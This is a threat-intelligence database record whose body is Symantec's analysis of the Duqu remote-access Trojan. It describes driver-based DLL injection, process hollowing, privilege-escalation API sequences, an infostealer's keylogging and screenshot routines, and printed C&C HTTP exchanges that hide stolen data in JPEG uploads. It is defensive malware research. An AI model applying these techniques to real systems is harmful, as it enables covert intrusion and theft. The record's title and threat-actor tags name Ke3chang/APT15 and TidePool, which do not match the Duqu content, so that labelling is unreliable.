{
    "id": "1a8fbfad-efc4-47cb-bc91-5749195d08fc",
    "created_at": "2023-01-12T15:04:17.608852Z",
    "updated_at": "2025-03-27T02:16:50.807853Z",
    "deleted_at": null,
    "sha1_hash": "4dd11662db54850675fed5f33428b5b4b75d9bab",
    "title": "2016-05-22 - Operation Ke3chang Resurfaces With New TidePool Malware",
    "authors": "",
    "file_creation_date": "2011-10-19T12:12:21Z",
    "file_modification_date": "2011-10-19T12:12:42Z",
    "file_size": 1591496,
    "plain_text": "## Security Response\n\n# W32.Duqu\n### The precursor to the next Stuxnet\n\n###### Contents Executive summary\nExecutive summary............................................ 1\n\nOn October 14, 2011, we were alerted to a sample by a research lab\n\nTechnical analysis............................................... 2\n\nwith strong international connections that appeared very similar to\n\nFile history..................................................... 2\n\nthe [Stuxnet worm from June of 2010. This threat has been named](http://www.symantec.com/business/security_response/writeup.jsp?docid=2010-071400-3123-99)\n\nComponent architecture............................... 3\n\nW32.Duqu [dyü-kyü] because it creates files with the file name pre­\n\nLoad point (JMINET7.SYS)............................ 4\n\nfix “~DQ”. The research lab provided their detailed initial report to us,\n\nMain loader (NETP191.PNF)......................... 5\n\nwhich we have added as an appendix. The threat was recovered from\n\nPayload loader (Resource 302)..................... 5\n\nan organization based in Europe. We have confirmed Duqu is a threat\n\nPayload— .zdata DLL.................................... 8\n\nnearly identical to Stuxnet, but with a completely different purpose.\n\nInfostealer................................................... 10\nVariants............................................................. 12\n\nDuqu is essentially the precursor to a future Stuxnet-like attack. The\n\nCMI4432.SYS.............................................. 12\n\nthreat was written by the same authors, or those that have access to the\n\nCMI4432.PNF.............................................. 12\n\nStuxnet source code, and appears to have been created after the last Stux­\n\nAcknowledgements.......................................... 13\n\nnet file we recovered. Duqu’s purpose is to gather intelligence data and\n\nAppendix........................................................... 13\n\nassets from entities such as industrial control system manufacturers in\n\nFile hashes................................................... 13\n\norder to more easily conduct a future attack against another third party.\nThe attackers are looking for information such as design documents that\n\n_The original research lab has also allowed us to include their_\n\n_detailed initial report, which you can find as an appendix._ could help them mount a future attack on an industrial control facility.\n\nDuqu does not contain any code related to industrial control systems\nand is primarily a remote access Trojan (RAT). The threat does not self-\nreplicate. Our telemetry shows the threat has been highly targeted to­\nward a limited number of organizations for their specific assets. How­\never, it’s possible that other attacks are being conducted against other\norganizations in a similar manner with currently undetected variants.\n\n\n-----\n\nThe attackers used Duqu to install another infostealer that can record keystrokes and collect other system\ninformation. The attackers were searching for information assets that could be used in a future attack. In one\ncase, the attackers did not appear to successfully exfiltrate any sensitive data, but details are not available on all\ncases. Two variants were recovered and, in reviewing our archive of submissions, the first recording of one of the\nbinaries was on September 1, 2011. However, based on file-compilation times, attacks using these variants may\nhave been conducted as early as December 2010.\n\nNote: At press time we have recovered additional variants from an additional organization in Europe with a com­\npilation time of October 17, 2011. These variants have not yet been analyzed.\n\nDuqu consists of a driver file, a DLL (that contains many embedded files), and a configuration file. These files\nmust be installed by another executable (the installer) which has not yet been recovered. The installer registers\nthe driver file as a service so it starts at system initialization. The driver then injects the main DLL into\nservices.exe. From here, the main DLL begins extracting other components and these components are injected\ninto other processes.\n\nOne of the variant’s driver files was signed with a valid digital certificate that expires on August 2, 2012. The\ndigital certificate belongs to a company headquartered in Taipei, Taiwan. The certificate was revoked on October\n14, 2011.\n\nDuqu uses HTTP and HTTPS to communicate to a command and control (C&C) server at 206.[REMOVED].97,\nwhich is hosted in India. Through the command and control server, the attackers were able to download addi­\ntional executables, including an infostealer that can perform actions such as enumerating the network, record­\ning keystrokes, and gathering system information. The information is logged to a lightly encrypted and com­\npressed local file, and then must be exfiltrated out.\n\nThe threat uses a custom command and control protocol, primarily downloading or uploading what appear to be\n.jpg files. However, in addition to transferring dummy .jpg files, additional data for exfiltration is encrypted and\nsent, and likewise received.\n\nFinally, the threat is configured to run for 36 days. After 36 days, the threat will automatically remove itself from\nthe system.\n\nDuqu shares a great deal of code with Stuxnet; however, the payload is completely different. Instead of a payload\ndesigned to sabotage an industrial control system, it has been replaced with general remote access capabilities.\nThe creators of Duqu had access to the source code of Stuxnet, not just the Stuxnet binaries. The attackers in­\ntend to use this capability to gather intelligence from a private entity that may aid future attacks on a third party.\n\nWhile suspected, no similar precursor files have been recovered that date prior to the Stuxnet attacks.\n\nAlso, the original research lab that discovered this threat has allowed us to include their detailed initial report,\nwhich you can find as an appendix.\n\nTable 1\n\n#### Technical analysis\n\n###### First Variant\n\n##### File history\n\n###### File Name Size Compile Time Purpose\n\nDuqu consists of three files: a driv­\ner, a main DLL, and an encrypted jminet7.sys 24,960 bytes 17:25:26 Wed. Nov. 3, 2010 Load at system start\nconfiguration file. Inside the main netp191.PNF 232,448 bytes 16:48:28 Thu. Nov. 4, 2010 Main DLL\nDLL is a resource numbered 302, 302 resource 194,048 bytes 08:41:29 Tue. Dec. 21, 2010 Loader for payload\nwhich is actually another DLL. Two\n\nnetp192.pnf 6,750 bytes Configuration file\n\nvariants of Duqu were recovered.\n\n|Table 1|Col2|Col3|Col4|\n|---|---|---|---|\n|First Variant||||\n|File Name|Size|Compile Time|Purpose|\n|jminet7.sys|24,960 bytes|17:25:26 Wed. Nov. 3, 2010|Load at system start|\n|netp191.PNF|232,448 bytes|16:48:28 Thu. Nov. 4, 2010|Main DLL|\n|302 resource|194,048 bytes|08:41:29 Tue. Dec. 21, 2010|Loader for payload|\n|netp192.pnf|6,750 bytes||Configuration file|\n\n\n-----\n\nIn addition, an infostealer was Table 2\nrecovered from the system that ap­ Second Variant\npears to have been downloaded by\nDuqu through the command and File Name Size Compile Time Purpose\ncontrol server. cmi4432.sys 29,568 bytes 17:25:26 Wed. Nov. 3, 2010 Load at system start\n\ncmi4432.pnf 192,512 bytes 07:12:41 Sun. Jul. 17, 2011 Main DLL\n\nBased on the compile times, we\ncan derive a history of the two 302 resource 256,512 bytes 08:41:29 Tue. Dec. 21 2010 Loader for payload\nvariants and the infostealer. The cmi4464.PNF 6,750 bytes Configuration file\nJMINET/NETP191 variant was\nthe first variant. In particular, Table 3\nJMINET/NETP191 may have been\nused in a separate attack as early Infostealer\nas December 2010 and based on\n\n###### File Name Size Compile Time Purpose\n\nthis incident we know it was still\nbeing used in September 2011. [TEMP FILE NAME] 85,504 bytes 03:25:18 Wed. Jun. 01, 2011 Steal information\nThe CMI4432 variant was devel­\noped later, and clearly used the\nsame components as the JMINET/NETP191 variant. However, the driver was signed and the main payload was\nupdated in July 2011. Finally, the infostealer appears to have been first created along the same timeframe, in\nJune 2011.\n\nNote that the recovered Stuxnet files date between June 2009 and March 2010 and therefore date prior to the\nfirst development of these variants.\n\n##### Component architecture\n\nThe threat begins execution at system start through a registered driver (JMINET7.SYS or CMI4432.SYS). The\ndriver file injects the main DLL (NETP191.PNF or CMI4432.PNF) into services.exe. Using the configuration file\n(NETP192.PNF or CMI4464.PNF), the main DLL extracts an embedded file: resource 302. Resource 302 is a DLL\nthat contains another Figure 1\nembedded section Threat architecture of the JMINET/NETP191 variant\n(.zdata) that contains the\nmain functionality of the\nthreat.\n\nNote that another ex­\necutable (the installer)\nmust have created the\ndriver, the configuration\nfile, and the main DLL,\nas well as registered the\ndriver as a service. This\ninstaller executable has\nnot been recovered.\n\nThe remaining parts\nof this document will\ndiscuss the JMINET7/\nNETP191 variant (vari­\nant 1) in terms of the\nseparate sections, and\nenumerates the minor\ndifferences between this\nand variant 2.\n\n|Table 2|Col2|Col3|Col4|\n|---|---|---|---|\n|Second Variant||||\n|File Name|Size|Compile Time|Purpose|\n|cmi4432.sys|29,568 bytes|17:25:26 Wed. Nov. 3, 2010|Load at system start|\n|cmi4432.pnf|192,512 bytes|07:12:41 Sun. Jul. 17, 2011|Main DLL|\n|302 resource|256,512 bytes|08:41:29 Tue. Dec. 21 2010|Loader for payload|\n|cmi4464.PNF|6,750 bytes||Configuration file|\n\n|Table 3|Col2|Col3|Col4|\n|---|---|---|---|\n|Infostealer||||\n|File Name|Size|Compile Time|Purpose|\n|[TEMP FILE NAME]|85,504 bytes|03:25:18 Wed. Jun. 01, 2011|Steal information|\n\n\n-----\n\n##### Load point (JMINET7.SYS)\n\nThe purpose of the driver is to activate the threat at system start. The driver is defined as a service with the\nname and display name of “JmiNET3” under the following registry subkey:\n```\n  HKEY _ LOCAL _ MACHINE\\SYSTEM\\CurrentControlSet\\Services\\JmiNET3\n\n```\nThe driver is loaded at kernel initialization (Start Type = 1) and is responsible for injecting the main DLL\n(NETP191.PNF) into a specified process. The process name to inject into, and the DLL file path that should be\ninjected, are located in the following registry subkey:\n```\n  HKEY _ LOCAL _ MACHINE\\SYSTEM\\CurrentControlSet\\Services\\JmiNET3\\FILTER\n\n```\nThe data held within the registry subkeys are encrypted. Once decrypted, the data has the following format:\n```\n  DWORD control[4]\n\n  DWORD encryption _ key\n\n  DWORD sizeof _ processname\n\n  BYTE processname[sizeof _ processname]\n\n  DWORD sizeof _ dllpath\n\n  BYTE dllpath[sizeof _ dllpath]\n\n```\nNote the encryption_key field. The DLL is encrypted on the disk and is decrypted using this key before it is in­\njected into other processes. The encryption uses a simple multiplication rolling key scheme. By default, the main\nDLL is located at%SystemDrive%\\inf\\netp191.pnf and the injected process is services.exe.\n\n\nThe driver will ensure the system is not in Safe Mode and no\ndebuggers are running. The driver then registers a Driver­\nReinitializationRoutine and calls itself (up to 200 times) un­\ntil it is able to detect the presence of the HAL.DLL file. This\nensures the system has been initialized to a point where it\ncan begin injecting the main DLL.\n\nThe driver injects the DLL by registering a callback with\nPsSetLoadImageNotifyRoutine. PsSetLoadImageNotifyRou­\ntine will execute the callback any time an image, such as a\nDLL or EXE, is loaded and prior to execution.\n\nIf the image loaded is KERNEL32.DLL, the driver will get the\naddresses of relevant APIs by comparing the hashes of their\nname to a predefined list.\n\nIf the image matches services.exe, the driver will inject\nsome trampoline code that contains the API addresses\nalong with the DLL. The entry point will then be modified to\npoint to the trampoline code.\n\nAs part of its operation JMINET7.SYS will also create two\ndevices:\n```\n\\DEVICE\\Gpd1\n\n\\Device\\{3093AAZ3-1092-2929-9391}\n\n```\nJMINET7.SYS is functionally equivalent and almost a binary\nmatch to MRXCLS.SYS from Stuxnet.\n\nFigure 2 shows how NETP191.PNF is injected.\n\n\nFigure 2\n###### How NETP191.PNF is injected\n\n\n-----\n\n##### Main loader (NETP191.PNF)\n\nNETP191.PNF is the main executable that will load all the other components. NETP191.PNF contains the payload\nDLL in resource 302 and an encrypted configuration data block. The NETP191.PNF DLL contains eight exports,\nnamed by number. These exports will extract resource 302, which loads the primary payload of the threat. The\nexports are as follows:\n\n\n##### Main loader (NETP191.PNF)\n\n\n\n- 1 - Start RPC through a thread\n\n- 2 - Run export number 6\n\n- 3 - Get the version information from the configuration data\n\n- 4 - Run export 5 (if and only if it is running on a 32bit platform)\n\n- 5 - Load the resource 302 DLL (resource 302 is a loader for the main\n\npayload)\n\n- 6 - Cleanup routine\n\n- 7 - Start the RPC component\n\n- 8 - The same as export number 1\n\n\nFigure 3\n###### Resource 302\n\n\nWhen executed, NetP191.pnf decrypts the configuration data stored in\nNetp192.pnf. A “lifetime” value in the configuration data is checked. If the\nsample has been running for more than 36 days then export number 2 is\ncalled. Export 2 calls export 6, which is the cleanup routine. This routine removes traces of the threat from the\ncompromised computer. If the threat has been running for less than 36 days, then it continues to function.\n\nNext, the threat checks if it is connected to the Internet by performing a DNS lookup for a domain stored in\nthe configuration data (in this instance the domain is Microsoft.com). If this fails, an additional DNS lookup is\nperformed on kasperskychk.dyndns.org. The threat expects this domain to resolve to 68.132.129.18, but it is not\ncurrently registered.\n\nNETP191.PNF will then inject itself into one of four processes:\n\n   - Explorer.exe\n\n   - IExplore.exe\n\n   - Firefox.exe\n\n   - Pccntmon.exe\n\nThe RPC component is only intended for local use and makes seven functions available. These are:\n\n   - Get the version information from the configuration data\n\n   - Load a module and run the export\n\n   - Load a module\n\n   - Create a process\n\n   - Read a file\n\n   - Write a file\n\n   - Delete a file\n\nOf these exported functions, Duqu only uses the first three in order to load and execute the embedded resource\n302. This RPC component is identical to Stuxnet’s RPC component. In addition, the DLL can scan for and attempt\nto disable a variety of security products.\n\n##### Payload loader (Resource 302)\n\nThis DLL file is contained within the main DLL, NetP191.pnf.\n\nResource 302 is a loader program. It can load the payload into memory and execute it in several different ways.\nThe payload is included in the .zdata section of resource 302. The .zdata section is compressed and consists of\nthe payload DLL, a configuration file containing C&C information, and a second DLL, which contains similar code\nto that found at the start of resource 302 itself.\n\n\n-----\n\nThe main function of resource 302 is to load a file into memory. Which file to load is not configurable, but\ninstead is hardcoded into the payload file that is stored in the .zdata section. We refer to this main function as\nLoadFile. Note that functionality also exists to allow the loading of a direct memory buffer, but is not utilized.\nLoadFile can be called as follows:\n```\nLoadFile ( LoadMethod, ProcessName, String );\n\n```\nWhere:\n\n- LoadMethod is a number from zero to three that specifies the loading technique to use (discussed below).\n\n- ProcessName is a preferred name to use for the newly loaded file.\n\n- A string that can be passed into resource 302 (normally this is set to 0).\n\nSummary of the LoadMethod 0 – 3:\n\n- 0: Hook Ntdll and call LoadLibrary with the parameter sort[RANDOM].nls. This file does not actually exist.\n\n- 1: Use a template .exe file to load the payload DLL by creating the executable process in suspended mode and\n\nthen resuming execution.\n\n- 2: Use CreateProcessAsUser to execute the template executable and elevate privileges as needed.\n\n- 3: Attempt to use an existing process name for the template executable and elevate privileges.\n\n###### Exports\n\nResource 302 has 12 exports. The majority of these exports call the LoadFile function, though each export calls\nit with different hardcoded parameters:\n\n- Export 1: LoadFile( 0, 0, 0)\n\n- Export 2: LoadFile( 1, 0, 0)\n\n- Export 4: LoadFile( 1, 0, 0)\n\n- Export 5: LoadFile( 1, 0, 0)\n\n- Export 7: LoadFile( 1, 0, arg0)\n\n- Export 10: LoadFile( 3, “iexplore.exe”, 0 )\n\n- Export 11: LoadFile( 3, “explorer.exe”, 0 )\n\n- Export 12: LoadFile( 2, “explorer.exe”, 0 )\n\n- Export 13: Run in svchost\n\n- Export 14: Load the second DLL in the .zdata section, and call export 16\n\n- Export 15: LoadFile( 3, “svchost.exe”, 0 )\n\n- Export 16: Inject payload in the default browser and elevate privileges\n\n###### Loading techniques\n\n Method 0\n\nThis method of loading involves reading ntdll.dll from memory and hooking the following functions:\n\n- ZwQueryAttriutesFile\n\n- ZwCloseFile\n\n- ZwOpen\n\n- ZwMapViewOfSection\n\n- ZwCreateSection\n\n- ZwQuerySection\n\nThese functions are replaced with new functions that monitor for the file name sort[RANDOM].nls. When Load­\nLibrary is called with that file name, these replacement functions that are called by LoadLibrary will load the DLL\nfrom a buffer in memory, rather than from the disk. In this way the payload can be loaded like a regular file on\ndisk, even though it does not exist on the disk (when searching for the file, it will not be found). This routine is\nsimilar to a routine used by Stuxnet.\n\n\n-----\n\n###### Method 1\n\nUsing this method a template executable is decoded from inside the loader. The template is an executable that\nwill load a DLL from a buffer and call a specified export from the loaded DLL. The loader populates the template\nwith the correct memory offsets so that it can find the payload and launch it.\n\nA chosen process is overwritten (it can be one of a list of processes, the default name is svchost.exe).\n\nThe chosen process is created in suspended mode and then is overwritten with the template executable. Then\nthe process is resumed and the template runs, loading the DLL and executing the specified export under the\nname of a legitimate process. This routine is also similar to the one used in Stuxnet.\n\n###### Method 2\n\nThis method is similar to Method 1, using the template-loading technique. However, Method 2 attempts to el­\nevate privileges before executing the template executable. It can use several different techniques to do this.\n\nFirst it attempts to gain the following privileges:\n\n- “SeDebugPrivilege”\n\n- “SeAssignPrimaryTokenPrivilege”\n\n- “SeCreateTokenPrivilege”\n\nIf this is sufficient the threat uses these to create the template process, as in Method 1.\n\nIf the threat still does not have sufficient access, then it will call the following APIs to try to elevate its privileges\nfurther:\n\n- GetKernelObjectSecurity\n\n- GetSEcurityDescriptorDACL\n\n- BuildExplicitAccessWithName\n\n- MakeAbsoluteSD\n\n- SetEntriesinACLW\n\n- SetSecurityDescriptorDACL\n\n- SetKernelObjectSecurity\n\nIf it is able to create the process after this, it proceeds. Otherwise it will try to gain the following privileges:\n\n- “SeTcbPrivilege”\n\n- “SeAssignPrimaryTokenPrivilege”\n\n- “SeIncreaseQuotaPrivilege”\n\n- “SeImpersonatePrivilege”\n\nThen the threat attempts to duplicate a token before using that token in a call to CreateProcessAsUser.\n\n###### Method 3\n\nThis method must be supplied by a process name that is already running. This method also uses the template ex­\necutable to execute the payload DLL and will try to use the last technique (mentioned above) to elevate privileges\nalso.\n\n###### .zdata section\n\nThe .zdata section is compressed and consists of three files and a header that points to each file.\n\nWhen the resource is decompressed, it is byte-for-byte identical to the data that is in resource 302 of\nCMI4432.PNF, the second variant. The resource in CMI4432.PNF is not an MZ file, it is simply the raw data stored\nin the resource.\n\nThe beginning of the decompressed .zdata section is shown below. The first dword (shown in red) is a magic\nvalue to denote the start of the index block. The next dword (shown in red) is the offset to the MZ file. The offset\nis 00009624 (you can see that next portion marked in red is an MZ file and it is at offset 9624). This is how the\n\n\n-----\n\nloader file finds the payload DLL in the .zdata section. It reads the 24h byte index block, which lets the loader\nknow the offset and size of the various files stored in the decompressed .zdata section.\n\nFigure 4\n###### Decompressed .zdata section\n\nIn the .zdata section there are two DLLs and one configuration file. The configuration file is not accessed by the\nloader at anytime, but is used exclusively by the payload. When the payload is loaded into memory and executed,\nthe loader also passes a pointer to the decompressed .zdata data so the payload has access to the configuration\nfile using the index block, as also show above.\n\nAs for the other DLL in the .zdata section, it is actually a copy of resource 302 itself, but it does not have a .zdata\nsection. Export 16 in the loader is able to extract this other DLL from the .zdata section and call export 16. How­\never, that function appears to be broken.\n\nThe index block (above) is the exact same layout that was used in the .stub section of the previous Stuxnet\nsamples.\n\nFigure 5\n###### The .zdata section inside Resource302.dll\n\n##### Payload— .zdata DLL\n\nThe .zdata section contains the final payload DLL and its associated configuration data. The .zdata payload DLL\nis decompressed and loaded by the resource 302 DLL, the payload loader.\n\nThe purpose of the .zdata DLL is command and control functionality, which appears to allow downloading and\nexecuting updates. However, since portions of the command and control analysis are still underway, other func­\ntionality may exist.\n\nThe command and control protocol uses HTTPS and HTTP. SMB command and control channel functionality also\nexists, but is not used as defined by the configuration data.\n\n\n-----\n\nTo function properly, it expects a blob of data (.zdata) with the following structure:\n```\n00000000 config _ res302  struc ; (sizeof=0x24)\n\n00000000 magic      dd ?\n\n00000004 main      ofs _ size ?\n\n0000000C config     ofs _ size ?\n\n00000014 template    ofs _ size ?\n\n0000001C null      ofs _ size ?\n\n00000024 config _ res302  ends\n\n```\nThe template is an executable file with an empty loader component which may be used by the module to load\nand execute other modules, potentially downloaded through the command and control server.\n\nThe configuration data contains a file name, %Temp%\\~DR0001.tmp, the command and control server IP ad­\ndress of 206.[REMOVED].97, and control flag bytes that influence its behavior. The command and control server\nis hosted in India. The configuration data is parsed and stored in separate objects.\n\nThe protocol works as follows. First an initial HTTPS exchange occurs. For HTTPS, Duqu uses the Windows\nWinHTTP APIs, which have SSL support. The HTTPS exchange is believed to transfer a session key. Then, a HTTP\nGET request to the root directory occurs using standard socket APIs.\n```\n--\nGET / HTTP/1.1\n\nCookie: PHPSESSID=spwkwq1mtuomg0g6h30jj203j3\n\nCache-Control: no-cache\n\nPragma: no-cache\n\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9)\n\nGecko/20100824 Firefox/3.6.9 (.NET CLR 3.5.30729)\n\nHost: 206.[REMOVED].97\n\nConnection: Keep-Alive\n\n--\n```\nNote that the custom cookie field is unique per request. The server replies with an HTTP 200 OK response con­\ntaining a small 54x54 white JPG file.\n```\n--\nHTTP/1.1 200 OK\n\nContent-Type: image/jpeg\n\nTransfer-Encoding: chunked\n\nConnection: Close\n\n--\n```\nThe module expects certain fields and it parses the response for them. It only continues if they are found. It then\nmakes a second HTTP POST request, uploading a default .jpg file that is embedded within the .zdata DLL, fol­\nlowed by data to send to the command and control server.\n```\n--\nPOST / HTTP/1.1\n\nCookie: PHPSESSID=spwkwq1tnsam0gg6hj0i3jg20h\n\nCache-Control: no-cache\n\nPragma: no-cache\n\nContent-Type: multipart/form-data;\n\nboundary=---------------------------b1824763588154\n\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9)\n\nGecko/20100824 Firefox/3.6.9 (.NET CLR 3.5.30729)\n\n```\n\n-----\n\n```\n  Host: 206.[REMOVED].97\n\n  Content-Length: 1802\n\n  Connection: Keep-Alive\n  ---------------------------b1824763588154\n\n  Content-Disposition: form-data; name=”DSC00001.jpg”\n\n  Content-Type: image/jpeg\n\n  [EMBEDDED JPEG AND STOLEN DATA]\n\n  --\n```\nThe server then acknowledges with:\n```\n  --\n  HTTP/1.1 200 OK\n\n  Connection: Keep-Alive\n\n  Content-Length: 0\n\n  --\n```\nThe data following the JPG is encrypted data that the client wishes to send to the command and control server.\nThe data is AES-encrypted using the prenegotiated session key and has the following format:\n```\n  00 BYTE[12] header, semi-fixed, starts with ‘SH’\n\n  0C BYTE type of payload\n\n  0D DWORD payload size (n)\n\n  11 DWORD sequence number\n\n  15 DWORD ack number / total size\n\n  19 DWORD unknown\n\n  1D BYTE[n] payload (encrypted, or encoded)\n\n```\nThe sequence number will increment with each transaction. Example types include 0x02, 0x05, 0x14, 0x0C,\n0x44. Typically the payload type will be set to 0x24, which is just a ping-type request. More information on each\ntype and their content will be published in a future edition, as the full scope of the command and control func­\ntionality is still being investigated.\n\nThe server can actually respond with encrypted data that will be decrypted and trigger further actions.\n\nWhile the SMB protocol is not configured for use, the code appears to be fully functional and may be used if com­\nmanded to do so. The configuration file would set a byte value to 1, specifying the SMB protocol. Instead of an\nIP address, a string representing a remote resource (e.g. \\\\RemoteServer\\) would be provided. The threat then\nconnects to the IPC$ share of the remote resource and can read and write to a file as necessary as a means of\ncommunication.\n\n##### Infostealer\n\nThis is a standalone executable. This file, while recovered on compromised computers, is not found within the\nother executables. This file was likely downloaded by Duqu at some time, or downloaded to the compromised\ncomputer through other means.\n\nThe file has a number of similarities with the other samples analyzed. In particular, the primary functionality is\nperformed by exported functions from a DLL contained within the executable. In addition, the contained DLL is\nstored as encrypted data in a JPEG file, similar to the command and control technique.\n\nThe file is an infostealer. When executed, it extracts the encrypted DLL from a JPEG stored within it and then ex­\necutes export number 2 of that DLL. The DLL steals data and stores it in a randomly numbered file in the user’s\n%Temp% folder, prepending the log files with ~DQ (e.g. ~DQ7.tmp). The file is compressed using bzip2 and then\nXOR-encrypted. The recorded data can consist of:\n\n  - Lists of running processes account details and domain information\n\n\n-----\n\n- Screenshots\n\n- Network information (interfaces, routing tables, shares list, etc.)\n\n- Key presses\n\n- Open window names\n\n- Enumerated shares\n\n- File exploration on all drives, including removable drives\n\n- Enumeration of computers in the domain through NetServerEnum\n\nThe executable’s behavior is determined through optional command-line parameters. The usage format is as fol­\nlows:\n```\nprogram xxx /in <cmdfile> /out <logfile>\n\n```\n- If cmdfile is not present, a default encrypted command blob is used, stored as one of the Infostealer’s resourc­\n\nes.\n\n- If logfile is not present, the log will be dumped to a random .tmp file in user’s %Temp% folder, prefixed with\n\n~DQ (e.g. ~DQ7.tmp).\n\nThe other Infostealer’s resource is the Infostealer DLL itself, embedded in a .jpg file.\n\nThe executable simply loads the DLL inside winlogon or svchost, and executes the appropriate export:\n\n- _1 (unused), similar to _2\n\n- _2 main\n\n- _3 (unused), similar to _2\n\n- _4 restart infostealer\n\n- _5 quit infostealer\n\nThe command blob determines what should be stolen and at which frequency.\n\nThe DLL offers nine main routines:\n\n- 65h: List of running processes, account details, and domain information\n\n- 66h: Drive names and information, including those of shared drives\n\n- 68h: Take a screenshot\n\n- 69h: Network information (interfaces, routing tables, shares list, etc.)\n\n- 67h: Keylogger\n\n- 6Ah: Window enumeration\n\n- 6Bh: Share enumeration\n\n- 6Dh: File exploration on all drives, including removable drives\n\n- 6Eh: Enumerate computers on the domain through NetServerEnum\n\nThe standard command blob (used when cmdfile is not specified) is:\n\n- 65h, frequency=30 seconds\n\n- 66h, frequency=30 seconds\n\n- 68h, frequency=30 seconds\n\n- 69h, frequency=30 seconds\n\n- 67h, frequency=30 seconds\n\n- 6Ah, frequency=30 seconds\n\n- 6Bh, frequency=30 seconds\n\n- 6Dh, frequency=30 seconds\n\nNote: The threat only uses eight routines (6Eh is not used).\n\nThe log file contains records with the following fields:\n\n- Type\n\n- Size\n\n- Flags\n\n- Timestamp\n\n\n-----\n\n#### Variants\n\nThe following section discusses the\ndifferences seen in the minor vari­\nants of Duqu.\n\n##### CMI4432.SYS\n\nThis is functionally equivalent to\nJMINET7.SYS except that CMI4432.\nSYS is digitally signed. The signa­\nture information is displayed in\nfigure 6.\n\n##### CMI4432.PNF\n\nThis file is a more recent variant of\nnetp191.pnf. The differences be­\ntween Netp191 and CMI4432.PNF\nare shown in figure 7.\n\nFigure 7\n###### Differences between variants\n\n\nFigure 6\n###### CMI4432.SYS signature information\n\n\n-----\n\n#### Acknowledgements\n\nWe wish to thank the research lab who notified us of the sample and provided their research and samples.\n\n#### Appendix\n\n##### File hashes\n\n|ppendix File hashes|Col2|\n|---|---|\n|Table 4||\n|Sample names and hashes||\n|File Name|MD5|\n|cmi4432.pnf|0a566b1616c8afeef214372b1a0580c7|\n|netp192.pnf|94c4ef91dfcd0c53a96fdc387f9f9c35|\n|cmi4464.PNF|e8d6b4dadb96ddb58775e6c85b10b6cc|\n|netp191.PNF|b4ac366e24204d821376653279cbad86|\n|cmi4432.sys|4541e850a228eb69fd0f0e924624b245|\n|jminet7.sys|0eecd17c6c215b358b7b872b74bfd800|\n|Infostealer|9749d38ae9b9ddd81b50aad679ee87ec|\n\n\n-----\n\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec\nCorporation.\n\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the\ntechnical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical\nerrors. Symantec reserves the right to make changes without prior notice.\n\n**About Symantec**\nSymantec is a global leader in\nproviding security, storage and\nsystems management solutions to\n\nhelp businesses and consumers\nsecure and manage their information.\nHeadquartered in Moutain View, Calif.,\n\nSymantec has operations in more\nthan 40 countries. More information\n\nis available at www.symantec.com.\n\n\ntechnical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical\nerrors. Symantec reserves the right to make changes without prior notice.\n\n**About Symantec**\nSymantec is a global leader in\nproviding security, storage and\nsystems management solutions to\n\n\nFor specific country offices and contact num­\nbers, please visit our Web site. For product\ninformation in the U.S., call\ntoll-free 1 (800) 745 6054.\n\n\nSymantec Corporation\n\nWorld Headquarters\n\n350 Ellis Street\nMountain View, CA 94043 USA\n\n+1 (650) 527-8000\nwww.symantec.com\n\n\nCopyright © 2011 Symantec Corporation. All rights reserved.\nSymantec and the Symantec logo are trademarks or registered\n\ntrademarks of Symantec Corporation or its affiliates in the\nU.S. and other countries. Other names may be trademarks of\n\ntheir respective owners.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/ICS SCADA/Duqu/W32.Duqu v1.0.pdf"
    ],
    "report_names": [
        "W32.Duqu v1.0.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "0a03e7f0-2f75-4153-9c4f-c46d12d3962e",
            "created_at": "2022-10-25T15:50:23.453824Z",
            "updated_at": "2025-03-27T02:00:55.473216Z",
            "deleted_at": null,
            "main_name": "Ke3chang",
            "aliases": [
                "Ke3chang",
                "APT15",
                "Vixen Panda",
                "GREF",
                "Playful Dragon",
                "RoyalAPT",
                "Nylon Typhoon"
            ],
            "source_name": "MITRE:Ke3chang",
            "tools": [
                "Okrum",
                "Systeminfo",
                "netstat",
                "spwebmember",
                "Mimikatz",
                "Tasklist",
                "MirageFox",
                "Neoichor",
                "ipconfig"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7c8cf02c-623a-4793-918b-f908675a1aef",
            "created_at": "2023-01-06T13:46:38.309165Z",
            "updated_at": "2025-03-27T02:00:02.801298Z",
            "deleted_at": null,
            "main_name": "APT15",
            "aliases": [
                "BRONZE PALACE",
                "Nylon Typhoon",
                "VIXEN PANDA",
                "Playful Dragon",
                "BRONZE DAVENPORT",
                "BRONZE IDLEWOOD",
                "G0004",
                "Red Vulture",
                "Ke3Chang",
                "Metushy",
                "Lurid",
                "Social Network Team",
                "Royal APT"
            ],
            "source_name": "MISPGALAXY:APT15",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7d5531e2-0ad1-4237-beed-af009035576f",
            "created_at": "2024-05-01T02:03:07.977868Z",
            "updated_at": "2025-03-27T02:05:17.283109Z",
            "deleted_at": null,
            "main_name": "BRONZE PALACE",
            "aliases": [
                "BRONZE DAVENPORT ",
                "BRONZE IDLEWOOD ",
                "CTG-9246 ",
                "Ke3chang ",
                "Playful Dragon",
                "Vixen Panda ",
                "APT15 "
            ],
